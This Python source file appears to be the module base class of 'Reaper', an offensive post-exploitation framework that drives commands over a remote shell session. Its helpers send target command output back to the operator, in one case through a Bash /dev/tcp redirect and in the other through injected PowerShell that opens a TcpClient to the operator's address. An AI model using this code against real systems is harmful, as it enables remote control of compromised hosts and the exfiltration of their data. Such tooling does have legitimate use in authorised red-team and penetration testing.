from __future__ import annotations

import argparse
import re
import select
import time
import uuid
from abc import ABC, abstractmethod
from typing import TYPE_CHECKING, List, Literal, Optional, Union

if TYPE_CHECKING:
    from reaper.session import Session

from reaper.models import CommandResult, StreamLine
from reaper.utils import ui
from reaper.utils.tcp import get_local_ip, spawn_recv_server

_PS_PROMPT      = re.compile(r"^PS\s+\S+>\s*")
_SELECT_TIMEOUT = 0.1

PlatformSpec = Union[
    Literal["linux", "windows_cmd", "windows_ps", "any"],
    List[Literal["linux", "windows_cmd", "windows_ps"]],
]


class CommandTimeout(Exception):
    def __init__(self, command: str, timeout: float):
        self.command = command
        self.timeout = timeout
        super().__init__(f"Command timed out after {timeout}s: {command}")


class ReaperModule(ABC):
    """
    Base class for all Reaper modules.

    Quickstart
    ----------
    Create a file in src/reaper/modules/ and subclass ReaperModule:

        from reaper.modules.blueprint import ReaperModule

        class MyModule(ReaperModule):
            name        = "my_module"
            description = "Does something cool."

            def run(self) -> None:
                result = self.exec("whoami")
                self.ok(f"Running as: {result.stdout.strip()}")
    """

    name:        str                 = "unnamed_module"
    description: str                 = "No description."
    usage:       str                 = ""
    arguments:   list[dict]          = []
    category:    Optional[str]       = None
    platform:    PlatformSpec        = "any"

    # ------------------------------------------------------------------ #

    @classmethod
    def supports(cls, os_type: Optional[str]) -> bool:
        if cls.platform == "any":
            return True
        if os_type is None:
            return False
        if isinstance(cls.platform, list):
            return os_type in cls.platform
        return cls.platform == os_type

    def __init__(self, session: "Session", args: Optional[List[str]] = None) -> None:
        self.session  = session
        self.raw_args = args or []
        self.args     = self._parse_args()
        self.ui       = ui
        self.notify   = ui.notify
        self.spinner  = ui.Spinner
        self.breaker  = ui.breaker
        self.box      = ui.print_report_box

    def _parse_args(self) -> argparse.Namespace:
        if not self.arguments:
            return argparse.Namespace()
        parser = argparse.ArgumentParser(prog=self.name, add_help=False)
        for arg in self.arguments:
            arg   = arg.copy()
            flags = arg.pop("flags")
            if isinstance(flags, list) and not flags[0].startswith("-"):
                parser.add_argument(flags[0], **arg)
            else:
                parser.add_argument(*flags, **arg)
        try:
            return parser.parse_args(self.raw_args)
        except SystemExit:
            return argparse.Namespace()

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _get_local_ip(self) -> str:
        return get_local_ip(self.session.addr[0])

    def _exec_clean(self, cmd: str, timeout: float = 10.0) -> str:
        """Run a Linux command and collect stdout via a side TCP channel."""
        local_ip = self._get_local_ip()
        port, collect = spawn_recv_server(timeout=timeout)
        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout)
        return collect().decode("utf-8", errors="replace").strip()

    def _win_query(self, ps_expr: str, timeout: float = 10.0) -> str:
        """Evaluate a PowerShell expression on a Windows target."""
        if self.session.upgraded:
            return self._win_query_sidechannel(ps_expr, timeout)

        sentinel = uuid.uuid4().hex
        marker   = f"__REAPER_{sentinel}__"
        if self.session.os_type == "windows_ps":
            cmd = f"({ps_expr}); '{marker}'"
        else:
            inner = f"({ps_expr}); '{marker}'"
            cmd   = f'powershell -NoProfile -NonInteractive -c "{inner}"'

        eol  = self.session.eol
        enc  = self.session.encoding
        self.session.conn.sendall((cmd + eol).encode(enc))

        buf      = b""
        deadline = time.monotonic() + timeout
        lines: list[str] = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            r, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not r:
                continue
            chunk = self.session.conn.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                raw, buf = buf.split(b"\n", 1)
                text     = raw.decode(enc, errors="replace").strip("\r\n ")
                text     = _PS_PROMPT.sub("", text).strip()
                if not text or "Write-Host" in text:
                    continue
                if marker in text:
                    return lines[-1] if lines else ""
                lines.append(text)

        return lines[-1] if lines else ""

    def _win_query_sidechannel(self, ps_expr: str, timeout: float = 10.0) -> str:
        local_ip = self._get_local_ip()
        port, collect = spawn_recv_server(timeout=timeout)
        ps_cmd = (
            f"$_r=({ps_expr})|Out-String;"
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
            f"$_s.Write($_b,0,$_b.Length);$_s.Flush();$_c.Close()"
        )
        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
        return collect().decode("utf-8", errors="replace").strip()

    # ------------------------------------------------------------------ #
    # Core execution
    # ------------------------------------------------------------------ #

    @abstractmethod
    def run(self) -> None: ...

    def exec(self, command: str, timeout: float = 30.0) -> CommandResult:
        sentinel = uuid.uuid4().hex
        marker   = f"__REAPER_DONE_{sentinel}__"
        wrapped  = f'( {command} ); _rc=$?; printf "\\n{marker}:$_rc\\n"\n'
        self.session.conn.sendall(wrapped.encode("utf-8"))

        buf          = b""
        deadline     = time.monotonic() + timeout
        output_lines = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise CommandTimeout(command, timeout)
            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not ready:
                continue
            chunk = self.session.conn.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                raw_line, buf = buf.split(b"\n", 1)
                text          = raw_line.decode("utf-8", errors="replace").rstrip("\r")
                if text.startswith(marker):
                    rc     = int(text.split(":")[-1]) if ":" in text else 0
                    output = "\n".join(output_lines)
                    return CommandResult(
                        command=command, returncode=rc,
                        stdout=output, stderr="",
                        duration=time.monotonic() - (deadline - timeout),
                    )
                output_lines.append(text)

        return CommandResult(
            command=command, returncode=1,
            stdout="\n".join(output_lines), stderr="",
            duration=0,
        )

    def exec_stream(self, command: str, timeout: float = 30.0):
        """Yield output lines from a remote command as StreamLine objects."""
        sentinel = uuid.uuid4().hex
        marker   = f"__REAPER_DONE_{sentinel}__"
        wrapped  = f'( {command} ); printf "\\n{marker}\\n"\n'
        self.session.conn.sendall(wrapped.encode("utf-8"))

        buf      = b""
        deadline = time.monotonic() + timeout

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise CommandTimeout(command, timeout)
            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not ready:
                continue
            chunk = self.session.conn.recv(4096)
            if not chunk:
                return
            buf += chunk
            while b"\n" in buf:
                raw_line, buf = buf.split(b"\n", 1)
                text          = raw_line.decode("utf-8", errors="replace").rstrip("\r")
                if marker in text:
                    return
                yield StreamLine(text=text)

    def send(self, data: bytes) -> bool:
        return self.session.send(data)

    def sendline(self, line: str, encoding: str = "utf-8") -> bool:
        return self.send((line + "\n").encode(encoding))

    def ok(self, msg: str)     -> None: self.notify("success", msg)
    def err(self, msg: str)    -> None: self.notify("error",   msg)
    def warn(self, msg: str)   -> None: self.notify("warning", msg)
    def status(self, msg: str) -> None: self.notify("status",  msg)

    def __str__(self)  -> str: return f"<ReaperModule {self.name!r} on session #{self.session.id}>"
    def __repr__(self) -> str: return self.__str__()
